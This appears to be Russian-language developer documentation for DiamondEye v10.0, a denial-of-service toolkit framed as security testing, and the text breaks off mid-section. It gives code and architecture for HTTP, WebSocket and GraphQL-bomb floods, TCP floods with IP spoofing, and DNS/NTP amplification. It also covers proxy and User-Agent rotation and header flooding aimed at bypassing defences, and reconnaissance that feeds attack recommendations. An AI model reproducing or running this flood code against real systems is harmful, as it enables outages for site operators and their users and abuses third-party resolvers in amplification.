# 🏗️ DIAMONDEYE v10.0 — ТЕХНИЧЕСКАЯ ДОКУМЕНТАЦИЯ  
## Полное руководство по архитектуре, разработке и расширению

**Версия:** 10.0 (Production) | **Статус:** Active Development  
**Авторы:** larion (@pelikan6) | **Дата обновления:** 2025  
**Версия документа:** 3.0  

---

## 📋 СОДЕРЖАНИЕ

1. [Обзор архитектуры](#1-обзор-архитектуры)
2. [Модуль: `main.py`](#2-модуль-mainpy)
3. [Модуль: `args.py`](#3-модуль-argspy)
4. [Модуль: `attack.py`](#4-модуль-attackpy)
5. [Модуль: `attack_manager.py`](#5-модуль-attack_managerpy)
6. [Модуль: `scanner.py`](#6-модуль-scannerpy)
7. [Модуль: `utils.py`](#7-модуль-utilspy)
8. [Модуль: `resource_monitor.py`](#8-модуль-resource_monitorpy)
9. [Layer4: `tcp_flood.py`](#9-layer4-tcp_floodpy)
10. [Amplification: `dns_amp.py`](#10-amplification-dns_amppy)
11. [Система плагинов](#11-система-плагинов)
12. [Proxy Manager](#12-proxy-manager)
13. [Утилиты](#13-утилиты)
14. [Сетевые протоколы](#14-сетевые-протоколы)
15. [Безопасность и обработка ошибок](#15-безопасность-и-обработка-ошибок)
16. [Производительность и оптимизация](#16-производительность-и-оптимизация)
17. [API для расширения](#17-api-для-расширения)
18. [Roadmap и развитие](#18-roadmap-и-развитие)
19. [Тестирование и QA](#19-тестирование-и-qa)
20. [Справочные материалы](#20-справочные-материалы)

---

## 1. ОБЗОР АРХИТЕКТУРЫ

### 1.1. Ключевые концепции

DiamondEye v10.0 — это **многослойная платформа для тестирования безопасности**, построенная на принципах:

- **Модульность**: Каждый слой атаки независим и заменяем
- **Масштабируемость**: От 1 до 100,000+ одновременных соединений
- **Адаптивность**: Динамическая подстройка под ответы цели
- **Расширяемость**: Плагинная архитектура для новых типов атак
- **Многослойность**: Поддержка Layer7 (HTTP), Layer4 (TCP), Amplification

### 1.2. Компонентная диаграмма v10.0

```
┌─────────────────────────────────────────────────────────────┐
│                    КОМАНДНАЯ СТРОКА                         │
└───────────────────────┬─────────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────────┐
│                      args.py                                │
│  • Парсинг аргументов                                      │
│  • Валидация данных                                        │
│  • Обработка зависимостей                                  │
└──────────────┬──────────────────────────────────────────────┘
               │
    ┌──────────┴──────────┐
    │                     │
┌───▼──────┐      ┌──────▼──────┐
│  main.py │      │ scanner.py  │
│  • Точка │      │  • Разведка  │
│    входа │      │    цели      │
│  • Управл│      │  • Сканиров. │
│    ение  │      │    портов    │
└───┬──────┘      └─────────────┘
    │
┌───▼──────────────────────────────────────────┐
│              attack_manager.py               │
│  • Центральный менеджер атак                 │
│  • Выбор типа атаки (L4/L7/Amplify)          │
│  • Управление ресурсами                      │
└───┬──────────────────────────────────────────┘
    │
    ├────────────────────────────────────────────┐
    │                                            │
┌───▼──────┐                            ┌───────▼──────┐
│ attack.py│                            │ resource_    │
│  • Layer7│                            │ monitor.py   │
│    HTTP  │                            │  • Мониторинг│
│  • WebSoc│                            │    ресурсов  │
│  • GraphQ│                            │  • Аналитика │
└───┬──────┘                            └──────────────┘
    │
┌───▼──────────────────────────────────────────┐
│           Плагинная система                  │
├──────────────────────────────────────────────┤
│ • slowloris_plugin.py    • udp_custom_plugin │
│ • Другие плагины                             │
└──────────────────────────────────────────────┘

    ├────────────────────────────────────────────┐
    │                                            │
┌───▼──────┐                            ┌───────▼──────┐
│tcp_flood │                            │   dns_amp    │
│  • Layer4│                            │  • DNS       │
│    TCP   │                            │    Amplify   │
│  • Raw   │                            │  • NTP       │
│    sockets│                           │    Amplify   │
└──────────┘                            └──────────────┘
```

### 1.3. Поток данных v10.0

```python
# Псевдокод основного потока
async def main():
    args = parse_args()                    # args.py
    
    # Режим разведки
    if args.recon:
        await start_recon(args)           # scanner.py
        return
    
    # Режим плагинов
    if args.plugin or args.list_plugins:
        await handle_plugins(args)        # plugin_manager.py
        return
    
    # Инициализация менеджера атак
    manager = AttackManager(args)         # attack_manager.py
    await manager.initialize()
    
    # Запуск выбранного типа атаки
    if args.attack_type == 'tcp':
        await manager.start_tcp_attack()  # tcp_flood.py
    elif args.attack_type == 'dns':
        await manager.start_dns_amplification()  # dns_amp.py
    else:
        await manager.start_http_attack() # attack.py
    
    # Параллельный мониторинг
    await manager.resource_monitor.monitor()
```

### 1.4. Технологический стек v10.0

| Компонент | Технология | Назначение |
|-----------|------------|------------|
| **Асинхронность** | asyncio + uvloop | Высокопроизводительная обработка I/O |
| **HTTP-клиент** | httpx + aiohttp | Поддержка HTTP/1.1, HTTP/2, HTTP/3 |
| **WebSocket** | websockets | WebSocket flood атаки |
| **Raw sockets** | socket (Python stdlib) | Layer4 TCP атаки |
| **DNS/Network** | dnspython + scapy | Amplification атаки |
| **Парсинг аргументов** | argparse | CLI интерфейс |
| **Статистика** | matplotlib | Визуализация графиков |
| **Системный мониторинг** | psutil | Контроль ресурсов системы |
| **Цветной вывод** | colorama | Улучшенная читаемость в терминале |
| **Proxy поддержка** | aiohttp-socks | SOCKS5/HTTP прокси |

### 1.5. Форматы данных v10.0

**Внутренние структуры:**
```python
AttackMetrics = TypedDict('AttackMetrics', {
    'total_requests': int,
    'successful': int,
    'failed': int,
    'success_rate': float,
    'average_rps': float,
    'peak_rps': float,
    'average_latency_ms': float
})

ResourceUsage = TypedDict('ResourceUsage', {
    'cpu_avg': float,
    'ram_avg': float,
    'network_mbps': float,
    'connections': int
})

ReconData = TypedDict('ReconData', {
    'dns_records': Dict[str, List[str]],
    'open_ports': List[int],
    'services': Dict[int, str],
    'ssl_info': Dict[str, Any],
    'vulnerabilities': List[Dict]
})
```

**Конфигурационный объект:**
```python
class AttackConfig(NamedTuple):
    attack_type: str  # 'http', 'tcp', 'dns', 'slowloris'
    target: Union[str, Tuple[str, int]]
    workers: int
    sockets: int
    duration: int
    # ... все параметры атаки
```

---

## 2. МОДУЛЬ: `main.py`

### 2.1. Назначение и ответственности v10.0

`main.py` — **главная точка входа приложения**, выполняющая:
- Инициализацию event loop (uvloop/asyncio)
- Парсинг аргументов командной строки
- Выбор режима работы (разведка/плагины/атака)
- Управление жизненным циклом приложения
- Обработку сигналов (SIGINT, SIGTERM)
- Генерацию отчетов и графиков

### 2.2. Ключевые функции v10.0

#### `async def main()`
**Основной цикл приложения:**
```python
async def main():
    # 1. Парсинг аргументов
    args = parse_args()
    
    # 2. Вывод баннера и информации
    print_banner()
    
    # 3. Обработка специальных режимов
    if args.list_plugins or args.plugin:
        await handle_plugins(args)
        return
    
    if args.recon:
        await handle_recon(args)
        return
    
    # 4. Валидация и нормализация
    if not validate_target(args):
        sys.exit(1)
    
    # 5. Проверка конфликтов параметров
    validate_arguments(args)
    
    # 6. Создание и запуск менеджера атак
    attack_manager = AttackManager(args)
    await attack_manager.initialize()
    
    # 7. Установка обработчиков сигналов
    setup_signal_handlers(attack_manager)
    
    # 8. Запуск атаки
    await attack_manager.start_attack()
    
    # 9. Генерация отчетов
    await generate_reports(attack_manager, args)
```

#### `async def handle_plugins(args)`
**Обработка системы плагинов:**
```python
async def handle_plugins(args):
    """Управление плагинами"""
    plugin_manager = PluginManager()
    
    if args.list_plugins:
        # Вывод списка плагинов
        await plugin_manager.discover_plugins()
        for plugin_info in plugin_manager.list_plugins():
            print_plugin_info(plugin_info)
        return
    
    if args.plugin:
        # Запуск плагина
        plugin = plugin_manager.get_plugin(args.plugin)
        if not plugin:
            print(f"Плагин '{args.plugin}' не найден")
            return
        
        # Загрузка конфигурации
        config = load_plugin_config(args.plugin_config)
        config.update(base_config_from_args(args))
        
        # Инициализация и запуск
        await plugin.initialize(config)
        result = await plugin.execute(config['target'])
        await plugin.cleanup()
        
        print_results(result)
```

#### `async def handle_recon(args)`
**Обработка разведки:**
```python
async def handle_recon(args):
    """Выполнение разведки цели"""
    scanner = ReconScanner(args.url or args.target_ip)
    
    # Выполнение сканирования
    results = await scanner.full_scan(
        full_scan=args.recon_full,
        ports=parse_port_range(args.recon_ports)
    )
    
    # Вывод отчета
    print(scanner.generate_report())
    
    # Сохранение результатов
    if args.recon_save:
        save_recon_report(results, args.recon_save)
    
    # Рекомендации по атаке
    await generate_attack_recommendations(results)
```

### 2.3. Обработка сигналов v10.0

```python
def setup_signal_handlers(attack_manager):
    """Настройка корректного завершения"""
    def signal_handler(signum, frame):
        print(f"\n{Fore.YELLOW}⚠️ Получен сигнал {signum}, завершение...{Style.RESET_ALL}")
        asyncio.create_task(attack_manager.stop_attack())
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Для asyncio в Windows
    if sys.platform == 'win32':
        loop = asyncio.get_event_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, lambda: signal_handler(sig, None))
```

### 2.4. Генерация отчетов v10.0

```python
async def generate_reports(attack_manager, args):
    """Генерация всех типов отчетов"""
    # Текстовый отчет
    if args.log:
        save_text_report(attack_manager, args.log)
    
    # JSON отчет
    if args.json:
        save_json_report(attack_manager, args.json)
    
    # Графики
    if args.plot and MATPLOTLIB_AVAILABLE:
        save_plot(attack_manager, args.plot)
    
    # Вывод итоговой статистики
    print_final_stats(attack_manager)
```

### 2.5. Оптимизации v10.0

1. **Динамическая загрузка модулей:**
```python
# Модули загружаются только при необходимости
if args.attack_type == 'tcp':
    from layers.layer4.tcp_flood import TCPFlood
    attack = TCPFlood(...)
elif args.attack_type == 'dns':
    from layers.amplification.dns_amp import DNSAmplifier
    attack = DNSAmplifier(...)
```

2. **Автоматическое определение ресурсов:**
```python
# Адаптация под локальные цели
if is_localhost(target):
    max_workers = min(args.workers, os.cpu_count() * 2)
    args.workers = max_workers
    print(f"Локальная цель: workers ограничены {max_workers}")
```

3. **Кэширование DNS запросов:**
```python
_dns_cache = {}
async def resolve_hostname_cached(hostname):
    if hostname not in _dns_cache:
        _dns_cache[hostname] = await resolve_hostname(hostname)
    return _dns_cache[hostname]
```

---

## 3. МОДУЛЬ: `args.py`

### 3.1. Структура аргументов v10.0

```python
# Группы аргументов для логической организации
argument_groups = {
    'attack_type': ['--attack-type', '--target-ip', '--target-port', '--amplification'],
    'layer7': ['-w', '-s', '-m', '-u', '-n', '-d', '--http2', '--http3', '--websocket'],
    'layer4': ['--spoof-ip', '--packet-size', '--packet-count', '--source-port'],
    'bypass': ['--junk', '--header-flood', '--random-host', '--path-fuzz', '--rotate-ua'],
    'recon': ['--recon', '--recon-full', '--recon-ports', '--recon-save'],
    'plugins': ['--plugin', '--list-plugins', '--plugin-config'],
    'proxy': ['--proxy', '--proxy-file', '--proxy-auto', '--proxy-timeout'],
    'monitoring': ['--monitor-interval', '--save-stats', '--resource-alert'],
    'reporting': ['-l', '--json', '--plot']
}
```

### 3.2. Валидация данных v10.0

#### Кастомные валидаторы:
```python
def validate_attack_type(value):
    """Валидация типа атаки"""
    valid_types = ['http', 'tcp', 'dns', 'slowloris']
    if value not in valid_types:
        raise argparse.ArgumentTypeError(
            f"Недопустимый тип атаки: {value}. Допустимо: {', '.join(valid_types)}"
        )
    return value

def validate_port_range(value):
    """Валидация диапазона портов для сканирования"""
    ports = set()
    for part in value.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            if not (1 <= start <= 65535 and 1 <= end <= 65535):
                raise argparse.ArgumentTypeError(f"Недопустимый диапазон портов: {part}")
            ports.update(range(start, end + 1))
        else:
            port = int(part)
            if not 1 <= port <= 65535:
                raise argparse.ArgumentTypeError(f"Недопустимый порт: {port}")
            ports.add(port)
    
    return sorted(ports)

def validate_ip_address(value):
    """Валидация IP адреса"""
    try:
        socket.inet_aton(value)
        return value
    except socket.error:
        raise argparse.ArgumentTypeError(f"Недопустимый IP адрес: {value}")
```

### 3.3. Зависимости и конфликты v10.0

```python
def validate_argument_dependencies(args):
    """Проверка зависимостей между аргументами"""
    
    # Проверка обязательных параметров для Layer4
    if args.attack_type in ['tcp', 'dns'] and not args.target_ip:
        print(f"{Fore.RED}❌ Для {args.attack_type} атаки требуется --target-ip{Style.RESET_ALL}")
        sys.exit(1)
    
    # Конфликты протоколов
    if args.http3 and args.proxy:
        print(f"{Fore.YELLOW}⚠️  HTTP/3 не поддерживает прокси — отключено{Style.RESET_ALL}")
        args.http3 = False
    
    if args.spoof_ip and sys.platform != 'linux':
        print(f"{Fore.YELLOW}⚠️  Спуфинг IP требует Linux с правами root{Style.RESET_ALL}")
        args.spoof_ip = False
    
    # Зависимости плагинов
    if args.plugin and args.attack_type != 'http':
        print(f"{Fore.YELLOW}⚠️  Плагины работают только с HTTP атаками{Style.RESET_ALL}")
        args.attack_type = 'http'
    
    # Автоматические подстановки
    if args.proxy_auto and not args.proxy_file:
        args.proxy_file = "proxies.txt"
    
    return args
```

### 3.4. Поддержка конфигурационных файлов v10.0

```python
def load_config_file(filepath, format='auto'):
    """Загрузка конфигурации из файла"""
    import yaml
    import json
    
    with open(filepath, 'r', encoding='utf-8') as f:
        # Автоопределение формата
        if format == 'auto':
            if filepath.endswith(('.yaml', '.yml')):
                config = yaml.safe_load(f)
            elif filepath.endswith('.json'):
                config = json.load(f)
            else:
                # Пробуем определить по содержимому
                content = f.read()
                f.seek(0)
                try:
                    config = json.loads(content)
                except json.JSONDecodeError:
                    config = yaml.safe_load(content)
        else:
            if format == 'yaml':
                config = yaml.safe_load(f)
            else:  # json
                config = json.load(f)
    
    # Конвертация в аргументы командной строки
    args_list = []
    for key, value in config.items():
        # Пропускаем None значения
        if value is None:
            continue
        
        # Флаги (boolean)
        if isinstance(value, bool):
            if value:
                args_list.append(f'--{key.replace("_", "-")}')
        # Списки
        elif isinstance(value, list):
            args_list.append(f'--{key.replace("_", "-")}')
            args_list.append(','.join(str(v) for v in value))
        # Остальные значения
        else:
            args_list.append(f'--{key.replace("_", "-")}')
            args_list.append(str(value))
    
    return args_list
```

---

## 4. МОДУЛЬ: `attack.py`

### 4.1. Архитектура класса DiamondEyeAttack v10.0

#### 4.1.1. Иерархия состояний
```
DiamondEyeAttack (Layer7)
├── Настройки (Settings)
│   ├── URL и параметры цели
│   ├── Конфигурация HTTP/HTTPS
│   └── Параметры протоколов (HTTP/2/3, WS)
├── Состояние (State)
│   ├── Счетчики (sent, failed, rps)
│   ├── История метрик
│   └── Активные задачи
├── Компоненты (Components)
│   ├── Пул HTTP клиентов
│   ├── WebSocket менеджер
│   └── Генератор запросов
└── Стратегии (Strategies)
    ├── HTTP Flood
    ├── Slowloris
    ├── Adaptive
    └── GraphQL Bomb
```

#### 4.1.2. Инициализация v10.0
```python
class DiamondEyeAttack:
    def __init__(self, **kwargs):
        # Основные параметры
        self.url = kwargs.get('url')
        self.workers = kwargs.get('workers', 10)
        self.sockets = kwargs.get('sockets', 100)
        
        # Протоколы и методы
        self.use_http2 = kwargs.get('use_http2', False)
        self.use_http3 = kwargs.get('use_http3', False)
        self.websocket = kwargs.get('websocket', False)
        self.methods = kwargs.get('methods', ['GET'])
        
        # Параметры атаки
        self.extreme = kwargs.get('extreme', False)
        self.flood = kwargs.get('flood', False)
        self.slow_rate = kwargs.get('slow_rate', 0.0)
        self.adaptive = kwargs.get('adaptive', False)
        
        # Заголовки и данные
        self.junk = kwargs.get('junk', False)
        self.header_flood = kwargs.get('header_flood', False)
        self.random_host = kwargs.get('random_host', False)
        self.data_size = kwargs.get('data_size', 0)
        
        # Статистика
        self.sent = 0
        self.failed = 0
        self.start_time = time.time()
        
        # Асинхронные примитивы
        self.lock = asyncio.Lock()
        self._shutdown_event = asyncio.Event()
        self.active_tasks = set()
        
        # Оптимизации
        self._client_pool = []  # Пул переиспользуемых клиентов
        self._ua_rotator = UserAgentRotator()  # Ротатор User-Agent
        self._proxy_manager = None  # Менеджер прокси
        
        # Мониторинг
        self.rps_history = []
        self.latency_samples = []
```

### 4.2. Система воркеров v10.0

#### 4.2.1. HTTP Worker
```python
class HTTPWorker:
    """Воркер для HTTP запросов с поддержкой HTTP/2/3"""
    
    def __init__(self, worker_id, attack):
        self.id = worker_id
        self.attack = attack
        self.client = None
        self.session = None
        self.stats = {
            'requests': 0,
            'errors': 0,
            'latency_sum': 0
        }
    
    async def run(self):
        """Основной цикл воркера"""
        # Инициализация клиента с поддержкой HTTP/2/3
        self.client = await self._create_http_client()
        
        try:
            while not self.attack._shutdown_event.is_set():
                # Генерация запроса
                request = self._build_request()
                
                # Отправка с учетом стратегии
                if self.attack.extreme:
                    await self._send_extreme(request)
                elif self.attack.flood:
                    await self._send_flood(request)
                elif self.attack.slow_rate > 0:
                    await self._send_slow(request)
                else:
                    await self._send_normal(request)
                
                # Задержка между запросами
                await self._apply_delay()
                
        except Exception as e:
            if self.attack.debug:
                print(f"[Worker {self.id}] Ошибка: {e}")
        finally:
            await self._cleanup()
    
    async def _create_http_client(self):
        """Создание HTTP клиента с учетом протокола"""
        limits = httpx.Limits(
            max_connections=1000,
            max_keepalive_connections=100,
            keepalive_expiry=5.0
        )
        
        if self.attack.use_http3:
            # Экспериментальная поддержка HTTP/3
            return httpx.AsyncClient(
                http3=True,
                verify=not self.attack.no_ssl_check,
                timeout=httpx.Timeout(10.0)
            )
        elif self.attack.use_http2:
            # HTTP/2 с мультиплексированием
            return httpx.AsyncClient(
                http2=True,
                limits=limits,
                verify=not self.attack.no_ssl_check
            )
        else:
            # Стандартный HTTP/1.1
            return httpx.AsyncClient(
                limits=limits,
                verify=not self.attack.no_ssl_check
            )
```

### 4.3. WebSocket поддержка v10.0

```python
class WebSocketManager:
    """Менеджер WebSocket соединений с поддержкой flood"""
    
    def __init__(self, attack):
        self.attack = attack
        self.connections = []
        self.message_queue = asyncio.Queue(maxsize=1000)
        self._message_generator = None
    
    async def connect_all(self):
        """Установка множества WebSocket соединений"""
        ws_url = self.attack.url.replace('http', 'ws')
        
        tasks = []
        for i in range(self.attack.workers * self.attack.sockets):
            task = asyncio.create_task(
                self._single_connection(ws_url, i)
            )
            tasks.append(task)
        
        # Ожидание установки соединений
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _single_connection(self, url, conn_id):
        """Одно WebSocket соединение с автоматическим переподключением"""
        while not self.attack._shutdown_event.is_set():
            try:
                async with websockets.connect(
                    url,
                    ssl=not self.attack.no_ssl_check,
                    ping_interval=None,
                    close_timeout=1
                ) as ws:
                    
                    # Регистрация соединения
                    self.connections.append(ws)
                    
                    # Задачи на отправку и получение
                    send_task = asyncio.create_task(self._send_messages(ws))
                    recv_task = asyncio.create_task(self._receive_messages(ws))
                    
                    # Ожидание завершения задач
                    done, pending = await asyncio.wait(
                        [send_task, recv_task],
                        return_when=asyncio.FIRST_COMPLETED
                    )
                    
                    # Отмена оставшихся задач
                    for task in pending:
                        task.cancel()
                    
            except (websockets.ConnectionClosed, OSError) as e:
                if self.attack.debug:
                    print(f"[WS {conn_id}] Переподключение: {e}")
                await asyncio.sleep(1.0)
            except Exception as e:
                if self.attack.debug:
                    print(f"[WS {conn_id}] Ошибка: {e}")
                await asyncio.sleep(5.0)
```

### 4.4. Стратегии атаки v10.0

#### 4.4.1. Adaptive Attack Strategy
```python
class AdaptiveStrategy:
    """Адаптивная стратегия с машинным обучением"""
    
    def __init__(self, attack):
        self.attack = attack
        self.history = deque(maxlen=100)
        self.current_state = 'ramp_up'
        self.optimal_rps = 0
        self.learning_rate = 0.1
        
    async def execute(self):
        """Выполнение адаптивной атаки"""
        print(f"{Fore.CYAN}🤖 Запуск адаптивной стратегии с ИИ...{Style.RESET_ALL}")
        
        states = {
            'ramp_up': self._ramp_up,
            'find_limit': self._find_limit,
            'maintain': self._maintain,
            'recover': self._recover
        }
        
        while not self.attack._shutdown_event.is_set():
            # Получение метрик
            metrics = await self._collect_metrics()
            self.history.append(metrics)
            
            # Анализ и принятие решения
            decision = self._analyze_state(metrics)
            
            # Выполнение действия
            if decision['action'] == 'change_state':
                self.current_state = decision['next_state']
                print(f"{Fore.YELLOW}🔄 Смена состояния: {self.current_state}{Style.RESET_ALL}")
            
            # Выполнение стратегии текущего состояния
            await states[self.current_state](metrics)
            
            # Пауза между итерациями
            await asyncio.sleep(decision.get('sleep', 5.0))
    
    def _analyze_state(self, metrics):
        """Анализ метрик с помощью простого ИИ"""
        # Анализ трендов
        if len(self.history) >= 10:
            recent_errors = sum(1 for m in list(self.history)[-10:] 
                              if m['error_rate'] > 0.3)
            if recent_errors >= 5:
                return {'action': 'change_state', 'next_state': 'recover'}
        
        # Анализ производительности
        if metrics['rps'] > self.optimal_rps * 1.5:
            self.optimal_rps = metrics['rps']
            return {'action': 'change_state', 'next_state': 'find_limit'}
        
        return {'action': 'continue'}
```

#### 4.4.2. GraphQL Bomb Strategy
```python
class GraphQLBombStrategy:
    """GraphQL атака с nested queries"""
    
    def __init__(self, attack):
        self.attack = attack
        self.query_templates = self._load_query_templates()
        self.variables_pool = self._generate_variables()
    
    async def execute(self):
        """Выполнение GraphQL бомбы"""
        print(f"{Fore.MAGENTA}💣 Запуск GraphQL Bomb...{Style.RESET_ALL}")
        
        url = self.attack.url.rstrip('/') + '/graphql'
        
        async with httpx.AsyncClient(timeout=30) as client:
            for i in range(1000):
                if self.attack._shutdown_event.is_set():
                    break
                
                # Выбор шаблона запроса
                template = random.choice(self.query_templates)
                
                # Генерация вложенного запроса
                depth = random.randint(5, 20)
                query = self._build_nested_query(template, depth)
                
                # Генерация переменных
                variables = self._generate_variables()
                
                try:
                    response = await client.post(
                        url,
                        json={'query': query, 'variables': variables},
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    # Анализ ответа
                    if response.status_code == 400 and 'depth' in response.text:
                        print(f"{Fore.YELLOW}⚠️  Обнаружено ограничение глубины{Style.RESET_ALL}")
                        depth = max(1, depth - 5)
                    
                    self.attack.sent += 1
                    
                except Exception as e:
                    self.attack.failed += 1
                    if self.attack.debug:
                        print(f"[GraphQL] Ошибка: {e}")
                
                await asyncio.sleep(0.001)
```

---

## 5. МОДУЛЬ: `attack_manager.py`

### 5.1. Архитектура AttackManager

```python
class AttackManager:
    """Центральный менеджер для управления всеми типами атак"""
    
    def __init__(self, args):
        self.args = args
        self.active_attack = None
        self.resource_monitor = None
        self.proxy_manager = None
        self.stats = {
            'start_time': time.time(),
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'rps_history': [],
            'bandwidth_history': []
        }
        self._running = False
        
    async def initialize(self):
        """Инициализация всех компонентов"""
        print(f"{Fore.CYAN}🔧 Инициализация DiamondEye v10.0...{Style.RESET_ALL}")
        
        # Инициализация прокси-менеджера
        if self.args.proxy_auto or self.args.proxy_file:
            self.proxy_manager = ProxyManager()
            await self.setup_proxies()
        
        # Инициализация монитора ресурсов
        self.resource_monitor = ResourceMonitor(
            alert_threshold=self.args.resource_alert
        )
        
        # Проверка прав для raw sockets
        if self.args.attack_type in ['tcp', 'dns'] and self.args.spoof_ip:
            await self.check_raw_socket_permissions()
        
        return True
```

### 5.2. Управление атаками

```python
async def start_attack(self):
    """Запуск выбранного типа атаки"""
    print(f"{Fore.GREEN}🚀 Запуск {self.args.attack_type.upper()} атаки{Style.RESET_ALL}")
    
    self._running = True
    
    # Запуск мониторинга ресурсов
    monitor_task = asyncio.create_task(
        self.resource_monitor.monitor(self.args.monitor_interval)
    )
    
    try:
        # Выбор типа атаки
        if self.args.attack_type == 'tcp':
            await self.start_tcp_attack()
        elif self.args.attack_type == 'dns':
            await self.start_dns_amplification()
        elif self.args.attack_type == 'slowloris':
            await self.start_slowloris_attack()
        else:
            await self.start_http_attack()
            
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка атаки: {e}{Style.RESET_ALL}")
        if self.args.debug:
            import traceback
            traceback.print_exc()
    finally:
        await self.stop_attack()
        monitor_task.cancel()
```

### 5.3. TCP Attack Management

```python
async def start_tcp_attack(self):
    """Запуск TCP флуда"""
    from layers.layer4.tcp_flood import TCPFlood
    
    print(f"{Fore.CYAN}⚡ TCP Flood на {self.args.target_ip}:{self.args.target_port}{Style.RESET_ALL}")
    
    flood = TCPFlood(
        target_ip=self.args.target_ip,
        target_port=self.args.target_port,
        workers=self.args.workers * 2,  # Больше воркеров для Layer4
        spoof_ip=self.args.spoof_ip,
        packet_size=self.args.packet_size,
        duration=self.args.duration
    )
    
    self.active_attack = flood
    await flood.start()
    
    # Обновление статистики
    self.stats['packets_sent'] = flood.sent_packets
    self.stats['bytes_sent'] = flood.sent_bytes
```

### 5.4. DNS Amplification Management

```python
async def start_dns_amplification(self):
    """Запуск DNS amplification атаки"""
    from layers.amplification.dns_amp import DNSAmplifier
    
    print(f"{Fore.CYAN}🌪️ DNS Amplification на {self.args.target_ip}{Style.RESET_ALL}")
    
    amplifier = DNSAmplifier(
        target_ip=self.args.target_ip,
        amplification_factor=50,
        workers=self.args.workers,
        duration=self.args.duration
    )
    
    self.active_attack = amplifier
    await amplifier.start()
    
    # Обновление статистики
    self.stats['packets_sent'] = amplifier.sent_queries
    self.stats['estimated_amplified'] = amplifier.estimated_amplified
```

### 5.5. HTTP Attack Management

```python
async def start_http_attack(self):
    """Запуск HTTP атаки (существующий код)"""
    from attack import DiamondEyeAttack
    
    # Подготовка прокси
    proxy = self.args.proxy
    if self.proxy_manager and self.proxy_manager.proxies:
        proxy = self.proxy_manager.get_next_proxy()
        print(f"{Fore.YELLOW}🔄 Использование прокси: {proxy}{Style.RESET_ALL}")
    
    attack = DiamondEyeAttack(
        url=self.args.url,
        workers=self.args.workers,
        sockets=self.args.sockets,
        methods=self.args.methods,
        useragents=self.args.useragents,
        no_ssl_check=self.args.no_ssl_check,
        debug=self.args.debug,
        proxy=proxy,
        use_http2=self.args.http2,
        use_http3=self.args.http3,
        websocket=self.args.websocket,
        auth=self.args.auth,
        h2reset=self.args.h2reset,
        graphql_bomb=self.args.graphql_bomb,
        adaptive=self.args.adaptive,
        slow_rate=self.args.slow,
        extreme=self.args.extreme,
        data_size=self.args.data_size,
        flood=self.args.flood,
        path_fuzz=self.args.path_fuzz,
        header_flood=self.args.header_flood,
        method_fuzz=self.args.method_fuzz,
        junk=self.args.junk,
        random_host=self.args.random_host
    )
    
    self.active_attack = attack
    await attack.start()
    
    # Обновление статистики
    self.stats['requests_sent'] = attack.sent
    self.stats['requests_failed'] = attack.failed
    self.stats['rps_history'] = attack.rps_history
```

---

## 6. МОДУЛЬ: `scanner.py`

### 6.1. Архитектура системы разведки

```python
class ReconScanner:
    """Система разведки для сбора информации о цели"""
    
    def __init__(self, target: str):
        self.target = target
        self.results: Dict[str, Any] = {}
        self.start_time = datetime.now()
        
    async def full_scan(self, full_scan: bool = True, ports: List[int] = None):
        """Полное сканирование цели"""
        print(f"{Fore.CYAN}🎯 Начало разведки: {self.target}{Style.RESET_ALL}")
        
        # Парсинг URL
        await self.parse_target()
        
        # DNS разведка
        await self.resolve_dns()
        
        # Сканирование портов
        await self.scan_ports(ports)
        
        # Обнаружение сервисов
        await self.detect_services()
        
        if full_scan:
            # SSL/TLS аудит
            await self.ssl_scan()
            
            # Поиск поддоменов
            await self.find_subdomains()
            
            # Проверка уязвимостей
            await self.check_vulnerabilities()
        
        # Генерация отчета
        self.results['scan_duration'] = (datetime.now() - self.start_time).total_seconds()
        self.results['timestamp'] = datetime.now().isoformat()
        
        return self.results
```

### 6.2. DNS разведка

```python
async def resolve_dns(self):
    """Разрешение DNS записей цели"""
    hostname = self.results['parsed_url']['hostname']
    records = {}
    
    # Поддерживаемые типы записей
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(hostname, record_type)
            records[record_type] = [str(r) for r in answers]
        except:
            records[record_type] = []
    
    # Дополнительная информация
    records['ipv4_count'] = len(records.get('A', []))
    records['ipv6_count'] = len(records.get('AAAA', []))
    
    # Проверка на Cloudflare
    txt_records = ' '.join(records.get('TXT', []))
    if 'cloudflare' in txt_records.lower():
        records['cloudflare_detected'] = True
    
    self.results['dns_records'] = records
```

### 6.3. Сканирование портов

```python
async def scan_ports(self, ports: List[int] = None):
    """Асинхронное сканирование портов"""
    if not ports:
        ports = self._get_default_ports()
    
    hostname = self.results['parsed_url']['hostname']
    open_ports = []
    
    # Семафор для ограничения параллельных соединений
    semaphore = asyncio.Semaphore(100)
    
    async def check_port(port: int):
        async with semaphore:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(hostname, port),
                    timeout=2.0
                )
                writer.close()
                await writer.wait_closed()
                return (port, "open")
            except (ConnectionRefusedError, asyncio.TimeoutError):
                return (port, "closed")
            except Exception as e:
                return (port, f"error: {str(e)}")
    
    # Параллельная проверка портов
    tasks = [check_port(port) for port in ports]
    results = await asyncio.gather(*tasks)
    
    for port, status in results:
        if status == "open":
            open_ports.append(port)
    
    self.results['port_scan'] = {
        'scanned_ports': ports,
        'open_ports': open_ports,
        'total_open': len(open_ports),
        'open_percentage': len(open_ports) / len(ports) * 100
    }
```

### 6.4. Обнаружение сервисов

```python
async def detect_services(self):
    """Определение сервисов на открытых портах"""
    if 'port_scan' not in self.results:
        return
    
    open_ports = self.results['port_scan']['open_ports']
    services = {}
    
    async def get_service_info(port: int):
        # Попытка получения баннера
        banner = await self.get_banner(port)
        
        # Определение сервиса по порту и баннеру
        service = self._identify_service(port, banner)
        
        # Дополнительная информация
        info = {
            'port': port,
            'service': service,
            'banner': banner[:100] if banner else None,
            'protocol': self._guess_protocol(port)
        }
        
        return port, info
    
    # Параллельное определение сервисов
    tasks = [get_service_info(port) for port in open_ports]
    results = await asyncio.gather(*tasks)
    
    for port, info in results:
        services[port] = info
    
    self.results['services'] = services
```

### 6.5. SSL/TLS аудит

```python
async def ssl_scan(self):
    """Проверка SSL/TLS конфигурации"""
